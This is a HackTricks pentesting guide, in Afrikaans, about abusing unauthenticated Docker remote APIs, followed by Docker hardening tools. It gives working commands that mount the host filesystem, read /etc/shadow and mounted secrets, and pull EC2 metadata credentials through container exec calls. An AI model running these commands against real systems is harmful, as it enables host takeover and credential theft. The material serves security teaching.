<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

## Docker Basiese Beginsels

### Wat is

Docker is die **voorste platform** in die **kontenerisasie-industrie**, wat **voortdurende innovasie** aanvoer. Dit maak die moeiteloos skep en verspreiding van toepassings moontlik, wat strek van **tradisioneel tot futuristies**, en verseker hul **veilige implementering** oor diverse omgewings.

### Basiese Docker-argitektuur

- **[containerd](http://containerd.io)**: Dit is 'n **kernuitvoering** vir kontenere, belas met die omvattende **bestuur van 'n konteiner se lewensiklus**. Dit behels die hantering van **beeldoorplasing en -stoor**, sowel as die toesig oor die **uitvoering, monitering en netwerking** van kontenere. **Meer gedetailleerde insigte** oor containerd word **verder ondersoek**.
- Die **kontainer-shim** speel 'n kritieke rol as 'n **tussenganger** in die hantering van **koplose kontenere**, wat naadloos oorneem vanaf **runc** nadat die kontenere ge√Ønisialiseer is.
- **[runc](http://runc.io)**: Gewaardeer vir sy **liggewig en universele konteineruitvoering**-vermo√´ns, is runc in lyn met die **OCI-standaard**. Dit word deur containerd gebruik om kontenere **te begin en te bestuur** volgens die **OCI-riglyne**, en het ontwikkel vanuit die oorspronklike **libcontainer**.
- **[grpc](http://www.grpc.io)** is noodsaaklik vir die **fasilitering van kommunikasie** tussen containerd en die **docker-engine**, wat **doeltreffende interaksie** verseker.
- Die **[OCI](https://www.opencontainers.org)** is van kardinale belang om die **OCI-spesifikasies** vir uitvoering en beelde te handhaaf, met die nuutste Docker-weergawes wat **voldoen aan beide die OCI-beeld en -uitvoering**-standaarde.

### Basiese opdragte
```bash
docker version #Get version of docker client, API, engine, containerd, runc, docker-init
docker info #Get more infomarion about docker settings
docker pull registry:5000/alpine #Download the image
docker inspect <containerid> #Get info of the contaienr
docker network ls #List network info
docker exec -it <containerid> /bin/sh #Get shell inside a container
docker commit <cotainerid> registry:5000/name-container #Update container
docker export -o alpine.tar <containerid> #Export container as tar file
docker save -o ubuntu.tar <image> #Export an image
docker ps -a #List running and stopped containers
docker stop <containedID> #Stop running container
docker rm <containerID> #Remove container ID
docker image ls #List images
docker rmi <imgeID> #Remove image
docker system prune -a
#This will remove:
#  - all stopped containers
#  - all networks not used by at least one container
#  - all images without at least one container associated to them
#  - all build cache
```
### Containerd

**Containerd** is spesifiek ontwikkel om te voldoen aan die behoeftes van houerplatforms soos **Docker en Kubernetes**, onder andere. Dit streef daarna om die uitvoering van houers te **vereenvoudig oor verskillende bedryfstelsels**, insluitend Linux, Windows, Solaris, en meer, deur bedryfstelsel-spesifieke funksionaliteit en stelseloproepe te abstraheer. Die doel van Containerd is om slegs die noodsaaklike funksies wat deur sy gebruikers vereis word, in te sluit, en om onnodige komponente uit te sluit. Dit word egter erken as 'n uitdagende taak om hierdie doel volledig te bereik.

'n Sleutelontwerpbepaling is dat **Containerd nie netwerkhantering hanteer nie**. Netwerking word beskou as 'n kritieke element in verspreide stelsels, met kompleksiteite soos Software Defined Networking (SDN) en diensontdekking wat aansienlik verskil van die een platform tot die ander. Daarom laat Containerd die netwerkaspekte oor aan die platforms wat dit ondersteun.

Terwyl **Docker Containerd gebruik** om houers uit te voer, is dit belangrik om te let dat Containerd slegs 'n subset van Docker se funksionaliteite ondersteun. Spesifiek ontbreek Containerd die netwerkbestuursmoontlikhede wat in Docker teenwoordig is, en ondersteun dit nie die direkte skepping van Docker-swerm nie. Hierdie onderskeid beklemtoon Containerd se gefokusde rol as 'n houer-uitvoeringsomgewing, wat meer gespesialiseerde funksionaliteite oorlaat aan die platforms waarmee dit integreer.
```bash
#Containerd CLI
ctr images pull --skip-verify --plain-http registry:5000/alpine:latest #Get image
ctr images list #List images
ctr container create registry:5000/alpine:latest alpine #Create container called alpine
ctr container list #List containers
ctr container info <containerName> #Get container info
ctr task start <containerName> #You are given a shell inside of it
ctr task list #Get status of containers
ctr tasks attach <containerName> #Get shell in running container
ctr task pause <containerName> #Stop container
ctr tasks resume <containerName> #Resume cotainer
ctr task kill -s SIGKILL <containerName> #Stop running container
ctr container delete <containerName>
```
### Podman

**Podman** is 'n oopbron houer-enjin wat voldoen aan die [Open Container Initiative (OCI) standaarde](https://github.com/opencontainers), ontwikkel en onderhou deur Red Hat. Dit steek uit bo Docker met verskeie onderskeidende kenmerke, veral sy **daemonlose argitektuur** en ondersteuning vir **rootless houers**, wat gebruikers in staat stel om houers sonder root-voorregte uit te voer.

Podman is ontwerp om versoenbaar te wees met Docker se API, wat die gebruik van Docker CLI-opdragte moontlik maak. Hierdie versoenbaarheid strek tot sy ekosisteem, wat gereedskap soos **Buildah** vir die bou van houerbeelds en **Skopeo** vir beeldoperasies soos stoot, trek en inspekteer insluit. Meer besonderhede oor hierdie gereedskap kan gevind word op hul [GitHub-bladsy](https://github.com/containers/buildah/tree/master/docs/containertools).

**Belangrike Verskille**

- **Argitektuur**: In teenstelling met Docker se klient-bedienermodel met 'n agtergrond-daemon, werk Podman sonder 'n daemon. Hierdie ontwerp beteken dat houers uitgevoer word met die voorregte van die gebruiker wat hulle begin, wat die veiligheid verbeter deur die behoefte aan root-toegang uit te skakel.

- **Systemd-integrasie**: Podman integreer met **systemd** om houers te bestuur, wat die bestuur van houers deur systemd-eenhede moontlik maak. Dit staan in kontras met Docker se gebruik van systemd hoofsaaklik vir die bestuur van die Docker-daemonproses.

- **Rootless Houers**: 'n Sleutelkenmerk van Podman is sy vermo√´ om houers onder die voorregte van die inisieerende gebruiker uit te voer. Hierdie benadering verminder die risiko's wat gepaard gaan met houer-oortredings deur te verseker dat aanvallers slegs die voorregte van die gekompromitteerde gebruiker verkry, nie root-toegang nie.

Podman se benadering bied 'n veilige en buigsame alternatief vir Docker, met die klem op gebruikersvoorregbestuur en versoenbaarheid met bestaande Docker-werkvloeie.

{% hint style="info" %}
Let daarop dat aangesien podman daarop gemik is om dieselfde API as docker te ondersteun, kan jy dieselfde opdragte met podman gebruik as met docker, soos:
```bash
podman --version
podman info
pdoman images ls
podman ls
```
{% endhint %}

## Basiese Inligting

Die afstands-API word standaard op poort 2375 uitgevoer as dit geaktiveer is. Die diens vereis standaard nie verifikasie nie, wat 'n aanvaller in staat stel om 'n bevoorregte docker-houer te begin. Deur die gebruik van die afstands-API kan 'n persoon gasheerders / (wortelgids) aan die houer koppel en l√™ers van die gasheer se omgewing lees/skryf.

**Standaardpoort:** 2375
```
PORT    STATE SERVICE
2375/tcp open  docker
```
## Enumerasie

### Handleiding

Let daarop dat jy die Docker API kan ondersoek deur die `docker`-opdrag of `curl` te gebruik, soos in die volgende voorbeeld:
```bash
#Using curl
curl -s http://open.docker.socket:2375/version | jq #Get version
{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"19.03.1","Details":{"ApiVersion":"1.40","Arch":"amd64","BuildTime":"2019-07-25T21:19:41.000000000+00:00","Experimental":"false","GitCommit":"74b1e89","GoVersion":"go1.12.5","KernelVersion":"5.0.0-20-generic","MinAPIVersion":"1.12","Os":"linux"}},{"Name":"containerd","Version":"1.2.6","Details":{"GitCommit":"894b81a4b802e4eb2a91d1ce216b8817763c29fb"}},{"Name":"runc","Version":"1.0.0-rc8","Details":{"GitCommit":"425e105d5a03fabd737a126ad93d62a9eeede87f"}},{"Name":"docker-init","Version":"0.18.0","Details":{"GitCommit":"fec3683"}}],"Version":"19.03.1","ApiVersion":"1.40","MinAPIVersion":"1.12","GitCommit":"74b1e89","GoVersion":"go1.12.5","Os":"linux","Arch":"amd64","KernelVersion":"5.0.0-20-generic","BuildTime":"2019-07-25T21:19:41.000000000+00:00"}

#Using docker
docker -H open.docker.socket:2375 version #Get version
Client: Docker Engine - Community
Version:           19.03.1
API version:       1.40
Go version:        go1.12.5
Git commit:        74b1e89
Built:             Thu Jul 25 21:21:05 2019
OS/Arch:           linux/amd64
Experimental:      false

Server: Docker Engine - Community
Engine:
Version:          19.03.1
API version:      1.40 (minimum version 1.12)
Go version:       go1.12.5
Git commit:       74b1e89
Built:            Thu Jul 25 21:19:41 2019
OS/Arch:          linux/amd64
Experimental:     false
containerd:
Version:          1.2.6
GitCommit:        894b81a4b802e4eb2a91d1ce216b8817763c29fb
runc:
Version:          1.0.0-rc8
GitCommit:        425e105d5a03fabd737a126ad93d62a9eeede87f
docker-init:
Version:          0.18.0
GitCommit:        fec3683
```
As jy die afgele√´ docker API kan **kontak met die `docker` bevel**, kan jy enige van die **docker** [**bevele wat voorheen** bespreek is](2375-pentesting-docker.md#basic-commands) uitvoer om met die diens te kommunikeer.

{% hint style="info" %}
Jy kan `export DOCKER_HOST="tcp://localhost:2375"` gebruik en die `-H` parameter met die docker bevel **vermy**.
{% endhint %}

#### Vinnige bevoorregte eskalasie
```bash
docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash
```
#### Curl

Soms sal jy sien dat **2376** beskikbaar is vir die **TLS** eindpunt. Ek kon nie daarin slaag om daarmee te verbind met die docker-kli√´nt nie, maar dit is moontlik om dit met curl te doen.
```bash
#List containers
curl ‚Äìinsecure https://tlsopen.docker.socket:2376/containers/json | jq
#List processes inside a container
curl ‚Äìinsecure https://tlsopen.docker.socket:2376/containers/f9cecac404b01a67e38c6b4111050c86bbb53d375f9cca38fa73ec28cc92c668/top | jq
#Set up and exec job to hit the metadata URL
curl ‚Äìinsecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/blissful_engelbart/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "wget -qO- http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"]}'
#Get the output
curl ‚Äìinsecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/4353567ff39966c4d231e936ffe612dbb06e1b7dd68a676ae1f0a9c9c0662d55/start -d '{}'
# list secrets (no secrets/swarm not set up)
curl -s ‚Äìinsecure https://tlsopen.docker.socket:2376/secrets | jq
#Check what is mounted
curl ‚Äìinsecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "mount"]}'
#Get the output by starting the exec
curl ‚Äìinsecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/7fe5c7d9c2c56c2b2e6c6a1efe1c757a6da1cd045d9b328ea9512101f72e43aa/start -d '{}'
#Cat the mounted secret
curl ‚Äìinsecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /run/secrets/registry-key.key"]}'
#List service (If you have secrets, it‚Äôs also worth checking out services in case they are adding secrets via environment variables)
curl -s ‚Äìinsecure https://tls-opendocker.socket:2376/services | jq
#Creating a container that has mounted the host file system and read /etc/shadow
curl ‚Äìinsecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket2376/containers/create?name=test -d '{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'
curl ‚Äìinsecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/start?name=test
curl ‚Äìinsecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /mnt/etc/shadow"]}'
curl ‚Äìinsecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/exec/140e09471b157aa222a5c8783028524540ab5a55713cbfcb195e6d5e9d8079c6/start -d '{}'
#Stop the container
curl ‚Äìinsecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/stop
#Delete stopped containers
curl ‚Äìinsecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/prune
```
As jy meer inligting wil h√™ oor hierdie, is meer inligting beskikbaar waar ek die opdragte gekopieer het: [https://securityboulevard.com/2019/02/abusing-docker-api-socket/](https://securityboulevard.com/2019/02/abusing-docker-api-socket/)

### Outomaties
```bash
msf> use exploit/linux/http/docker_daemon_tcp
nmap -sV --script "docker-*" -p <PORT> <IP>
```
## Kompromittering

In die volgende bladsy kan jy maniere vind om **uit 'n Docker-houer te ontsnap**:

{% content-ref url="../linux-hardening/privilege-escalation/docker-security/" %}
[docker-security](../linux-hardening/privilege-escalation/docker-security/)
{% endcontent-ref %}

Deur hiervan misbruik te maak, is dit moontlik om uit 'n houer te ontsnap. Jy kan 'n swak houer op die afgele√´ masjien uitvoer, daaruit ontsnap en die masjien kompromitteer:
```bash
docker -H <host>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
cat /mnt/etc/shadow
```
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py)

## Voorregverhoging

As jy binne 'n gasheer is wat Docker gebruik, kan jy [**hierdie inligting lees om te probeer om voorregte te verhoog**](../linux-hardening/privilege-escalation/#writable-docker-socket).

## Ontdekking van geheime in lopende Docker-houers
```bash
docker ps [| grep <kubernetes_service_name>]
docker inspect <docker_id>
```
Kyk na **env** (omgewingsveranderlike afdeling) vir geheime en jy mag dalk vind:

* Wagwoorde.
* IP-adresse.
* Poorte.
* Paaie.
* Ander... .

As jy 'n l√™er wil onttrek:
```bash
docker cp <docket_id>:/etc/<secret_01> <secret_01>
```
## Beveiliging van jou Docker

### Beveiliging van Docker installasie en gebruik

* Jy kan die instrument [https://github.com/docker/docker-bench-security](https://github.com/docker/docker-bench-security) gebruik om jou huidige Docker installasie te ondersoek.
* `./docker-bench-security.sh`
* Jy kan die instrument [https://github.com/kost/dockscan](https://github.com/kost/dockscan) gebruik om jou huidige Docker installasie te ondersoek.
* `dockscan -v unix:///var/run/docker.sock`
* Jy kan die instrument [https://github.com/genuinetools/amicontained](https://github.com/genuinetools/amicontained) gebruik om die voorregte te bepaal wat 'n houer sal h√™ wanneer dit met verskillende sekuriteitsopsies uitgevoer word. Dit is nuttig om die implikasies van die gebruik van sekuriteitsopsies vir die uitvoer van 'n houer te ken:
* `docker run --rm -it r.j3ss.co/amicontained`
* `docker run --rm -it --pid host r.j3ss.co/amicontained`
* `docker run --rm -it --security-opt "apparmor=unconfined" r.j3ss.co/amicontained`

### Beveiliging van Docker Images

* Jy kan 'n Docker-beeld van [https://github.com/quay/clair](https://github.com/quay/clair) gebruik om jou ander Docker-beelde te skandeer en kwesbaarhede te vind.
* `docker run --rm -v /root/clair_config/:/config -p 6060-6061:6060-6061 -d clair -config="/config/config.yaml"`
* `clair-scanner -c http://172.17.0.3:6060 --ip 172.17.0.1 ubuntu-image`

### Beveiliging van Dockerfiles

* Jy kan die instrument [https://github.com/buddy-works/dockerfile-linter](https://github.com/buddy-works/dockerfile-linter) gebruik om jou Dockerfile te ondersoek en allerlei verkeerde konfigurasies te vind. Elke verkeerde konfigurasie sal 'n ID kry, jy kan hier [https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md](https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md) vind hoe om elkeen van hulle reg te stel.
* `dockerfilelinter -f Dockerfile`

![](<../.gitbook/assets/image (418).png>)

* Jy kan die instrument [https://github.com/replicatedhq/dockerfilelint](https://github.com/replicatedhq/dockerfilelint) gebruik om jou Dockerfile te ondersoek en allerlei verkeerde konfigurasies te vind.
* `dockerfilelint Dockerfile`

![](<../.gitbook/assets/image (419).png>)

* Jy kan die instrument [https://github.com/RedCoolBeans/dockerlint](https://github.com/RedCoolBeans/dockerlint) gebruik om jou Dockerfile te ondersoek en allerlei verkeerde konfigurasies te vind.
* `dockerlint Dockerfile`

![](<../.gitbook/assets/image (420).png>)

* Jy kan die instrument [https://github.com/hadolint/hadolint](https://github.com/hadolint/hadolint) gebruik om jou Dockerfile te ondersoek en allerlei verkeerde konfigurasies te vind.
* `hadolint Dockerfile`

![](<../.gitbook/assets/image (421).png>)

### Log van Verdagte aktiwiteit

* Jy kan die instrument [https://github.com/falcosecurity/falco](https://github.com/falcosecurity/falco) gebruik om **verdagte gedrag in lopende houers** op te spoor.
* Merk op in die volgende blok hoe **Falco 'n kernmodule saamstel en dit invoeg**. Daarna laai dit die re√´ls en **begin om verdagte aktiwiteite te log**. In hierdie geval het dit 2 bevoorregte houers opgespoor wat begin is, waarvan een 'n sensitiewe koppeling het, en na 'n paar sekondes het dit opgespoor hoe 'n skulp geopen is binne een van die houers.
```bash
docker run -it --privileged -v /var/run/docker.sock:/host/var/run/docker.sock -v /dev:/host/dev -v /proc:/host/proc:ro -v /boot:/host/boot:ro -v /lib/modules:/host/lib/modules:ro -v /usr:/host/usr:ro falco
* Setting up /usr/src links from host
* Unloading falco-probe, if present
* Running dkms install for falco

Kernel preparation unnecessary for this kernel.  Skipping...

Building module:
cleaning build area......
make -j3 KERNELRELEASE=5.0.0-20-generic -C /lib/modules/5.0.0-20-generic/build M=/var/lib/dkms/falco/0.18.0/build.............
cleaning build area......

DKMS: build completed.

falco-probe.ko:
Running module version sanity check.
modinfo: ERROR: missing module or filename.
- Original module
- No original module exists within this kernel
- Installation
- Installing to /lib/modules/5.0.0-20-generic/kernel/extra/
mkdir: cannot create directory '/lib/modules/5.0.0-20-generic/kernel/extra': Read-only file system
cp: cannot create regular file '/lib/modules/5.0.0-20-generic/kernel/extra/falco-probe.ko': No such file or directory

depmod...

DKMS: install completed.
* Trying to load a dkms falco-probe, if present
falco-probe found and loaded in dkms
2021-01-04T12:03:20+0000: Falco initialized with configuration file /etc/falco/falco.yaml
2021-01-04T12:03:20+0000: Loading rules from file /etc/falco/falco_rules.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/falco_rules.local.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/k8s_audit_rules.yaml:
2021-01-04T12:03:24+0000: Starting internal webserver, listening on port 8765
2021-01-04T12:03:24.646959000+0000: Notice Privileged container started (user=<NA> command=container:db5dfd1b6a32 laughing_kowalevski (id=db5dfd1b6a32) image=ubuntu:18.04)
2021-01-04T12:03:24.664354000+0000: Notice Container with sensitive mount started (user=<NA> command=container:4822e8378c00 xenodochial_kepler (id=4822e8378c00) image=ubuntu:modified mounts=/:/host::true:rslave)
2021-01-04T12:03:24.664354000+0000: Notice Privileged container started (user=root command=container:4443a8daceb8 focused_brahmagupta (id=4443a8daceb8) image=falco:latest)
2021-01-04T12:04:56.270553320+0000: Notice A shell was spawned in a container with an attached terminal (user=root xenodochial_kepler (id=4822e8378c00) shell=bash parent=runc cmdline=bash terminal=34816 container_id=4822e8378c00 image=ubuntu)
```
### Monitering Docker

Jy kan auditd gebruik om Docker te monitor.

## Verwysings
* [https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html](https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html)
* [https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc](https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc)

<details>

<summary><strong>Leer AWS hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**offisi√´le PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>
